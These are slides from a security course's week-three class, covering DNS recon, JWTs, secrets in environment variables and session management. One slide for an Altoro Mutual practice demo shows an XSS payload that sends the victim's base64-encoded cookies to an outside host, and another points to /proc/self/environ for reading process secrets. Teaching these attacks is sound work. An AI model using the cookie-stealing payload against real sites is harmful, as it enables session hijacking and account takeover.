---
title: "Week 3 - Auth and IAM"
layout: "bundle"
outputs: ["Reveal"]
date: 2023-02-24T02:57:21+10:00
---

{{< slide class="center" >}}

## Week 3

---

## DNS Recon Recap

* Walkthrough
  * [Sublist3r](https://github.com/aboul3la/Sublist3r)
  * [Word List](https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS)

---

## Lecture Review

* Build a Flask app
* Python semantics, `__name__`, `__main__`, `__dir__`
* JWT

---

## More on JWT

* Anatomy of a JWT token
* What should be in a JWT token
* Pros and Cons
* Store secrets in a `.env`?

---

# DevOps, DevSecOps, DevSec..Oops..

{{% section %}}

More on this in later weeks

* `.env` + `.gitignore`
* Scoped env command

---

If it's in the environment, it's accessible to the entire process.  
Even if you unset it in the code >:(

* `/proc/self/environ`

{{% /section %}}

---

> Alternatives

* External data sources (config servers)
  * i.e. AWS Parameter Store
  * i.e. Google Secrets Manager
  * i.e. HashiCorp Vault
  * i.e. Apple KeyChain

---

## Back to Altoro Mutual

jk the demo did work I was just dumb

> 👉 Login as admin first 👈

```
<script>fetch("https://[...]/?v="+btoa(document.cookie))</script>aaa
```

---

## How to be a script kiddie

* Python + `requests`
* Node.js + `node-fetch`
* JavaScript + `fetch`
* JavaScript + `XMLHTTPRequest`
* etc

---

## Session Management

* Last week, auth via cookies
* What does it mean to "log out"
